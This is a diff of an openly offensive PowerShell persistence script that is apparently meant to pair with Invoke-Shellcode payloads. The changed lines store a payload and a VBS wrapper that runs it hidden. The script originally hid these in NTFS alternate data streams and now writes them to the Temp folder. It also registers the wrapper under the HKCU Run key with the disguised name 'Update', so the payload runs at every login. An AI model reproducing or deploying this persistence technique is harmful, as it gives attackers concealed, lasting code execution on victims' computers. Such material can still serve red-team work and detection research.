@@ -67,21 +67,21 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     #Store VBS Wrapper
     $vbstext1 = "Dim objShell"
     $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
-    $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData\Local\Temp:$textFile) do %i"""
+    $vbstext3 = "command = ""cmd /C for /f """"delims=,"""" %i in ($env:UserProfile\AppData\Local\Temp\$textFile) do %i"""
     $vbstext4 = "objShell.Run command, 0"
     $vbstext5 = "Set objShell = Nothing"
     $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5
 
     #Create Alternate Data Streams for Payload and Wrapper
     $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData\Local\Temp\$textFile"}
-    $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
+    $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData\Local\Temp\$vbsFile"}
     Invoke-Command -ScriptBlock $CreatePayloadADS
-    "Payload stored in $env:USERPROFILE\AppData\Local\Temp:$textFile"
+    "Payload stored in $env:USERPROFILE\AppData\Local\Temp\$textFile"
     Invoke-Command -ScriptBlock $CreateWrapperADS
-    "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"
+    "Wrapper stored in $env:USERPROFILE\AppData\Local\Temp\$vbsFile"
 
     #Persist in Registry
-    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
+    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData\Local\Temp\$vbsFile" -Force
     "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
 }
 
